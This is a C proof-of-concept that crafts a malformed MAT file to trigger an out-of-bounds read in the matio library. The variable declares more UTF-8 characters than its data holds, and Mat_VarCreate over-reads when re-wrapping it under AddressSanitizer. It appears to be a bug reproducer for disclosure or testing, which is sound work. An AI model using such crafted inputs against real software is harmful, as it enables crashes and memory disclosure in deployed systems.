/*
 * residual.c - craft a v5 MAT file whose UTF-8 char variable declares more
 * characters in its dimensions than its stored data decodes to, read it back
 * with the public matio API, and re-wrap the returned data with
 * Mat_VarCreate. The reader hands back the buffer together with dimensions
 * that over-count its contents, and Mat_VarCreate's UTF-8 length scan trusts
 * those dimensions, reading past the end of the buffer.
 *
 * Build (against an AddressSanitizer-instrumented libmatio):
 *   gcc -fsanitize=address -g -O1 -I src -I build-asan/src pocs/residual.c \
 *       build-asan/libmatio.a -lz -lm -o residual_poc
 * Run:
 *   ASAN_OPTIONS=detect_leaks=0 ./residual_poc
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "matio.h"

#define POC_PATH "/tmp/matio_poc_utf8_overcount.mat"

static void put32(FILE *f, unsigned int v)
{
    fwrite(&v, 4, 1, f);
}

static void putpad(FILE *f, int n)
{
    while ( n-- > 0 )
        fputc(0, f);
}

/* 1x8 MAT_C_CHAR variable "a" of type miUTF8: the dimension array declares 8
 * characters, but the 8 stored bytes hold only 4 two-byte characters. Every
 * sequence in the data is complete and valid UTF-8. */
static void write_poc(const char *path)
{
    static const unsigned char payload[8] = {0xC3, 0xA9, 0xC3, 0xA9, 0xC3, 0xA9, 0xC3, 0xA9};
    FILE *f = fopen(path, "wb");
    char hdr[116];
    unsigned short version = 0x0100;

    if ( f == NULL ) {
        perror("fopen");
        exit(2);
    }

    memset(hdr, ' ', sizeof(hdr));
    memcpy(hdr, "MATLAB 5.0 MAT-file, Platform: GLNXA64, Created by hand", 54);
    fwrite(hdr, 1, 116, f);
    putpad(f, 8); /* subsystem offset */
    fwrite(&version, 2, 1, f);
    fwrite("IM", 2, 1, f);

    put32(f, 14); /* miMATRIX */
    put32(f, 64); /* body: 16 + 16 + 16 + 16 */
    put32(f, 6);  /* miUINT32 array flags */
    put32(f, 8);
    put32(f, 4); /* MAT_C_CHAR */
    put32(f, 0); /* nzmax */
    put32(f, 5); /* miINT32 dimensions */
    put32(f, 8);
    put32(f, 1); /* 1 row */
    put32(f, 8); /* 8 columns: declares 8 characters */
    put32(f, 1); /* miINT8 name */
    put32(f, 1);
    fputc('a', f);
    putpad(f, 7);
    put32(f, 16); /* miUTF8 */
    put32(f, 8);  /* 8 bytes = 4 characters */
    fwrite(payload, 1, 8, f);

    fclose(f);
}

int main(void)
{
    mat_t *mat;
    matvar_t *matvar, *copy;

    write_poc(POC_PATH);

    mat = Mat_Open(POC_PATH, MAT_ACC_RDONLY);
    if ( mat == NULL ) {
        fprintf(stderr, "Mat_Open failed\n");
        return 2;
    }

    matvar = Mat_VarReadNext(mat);
    if ( matvar == NULL ) {
        /* Reader rejected the variable: nothing to re-wrap. */
        printf("variable rejected by reader\n");
        Mat_Close(mat);
        return 0;
    }

    printf("read \"%s\": nbytes=%zu, dims=%zux%zu\n", matvar->name, matvar->nbytes, matvar->dims[0],
           matvar->dims[1]);

    /* Re-wrap the data the reader returned, as the matio docs describe for
     * building variables from existing buffers. */
    copy = Mat_VarCreate("copy", MAT_C_CHAR, MAT_T_UTF8, matvar->rank, matvar->dims, matvar->data,
                         0);
    if ( copy != NULL ) {
        printf("created copy: nbytes=%zu\n", copy->nbytes);
        Mat_VarFree(copy);
    }
    Mat_VarFree(matvar);
    Mat_Close(mat);
    printf("no crash\n");
    return 0;
}
